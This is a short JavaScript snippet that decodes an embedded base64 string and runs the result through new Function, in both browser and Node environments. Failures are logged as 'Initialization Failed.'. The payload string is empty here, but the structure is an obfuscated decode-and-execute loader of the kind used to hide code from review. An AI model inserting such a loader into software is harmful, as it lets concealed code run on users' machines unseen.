(function(){
try{
var _b64="";
var _decoded;
if(typeof window!=='undefined'&&typeof window.atob==='function'){
var binStr=window.atob(_b64);
var len=binStr.length;
var bytes=new Uint8Array(len);
for(var i=0;i<len;i++)bytes[i]=binStr.charCodeAt(i);
_decoded=new window.TextDecoder('utf-8').decode(bytes);
}else{
_decoded=Buffer.from(_b64,'base64').toString('utf-8');
}
var _appFn=new Function(_decoded);
_appFn();
}catch(e){
console.error("Initialization Failed.",e);
}
})();
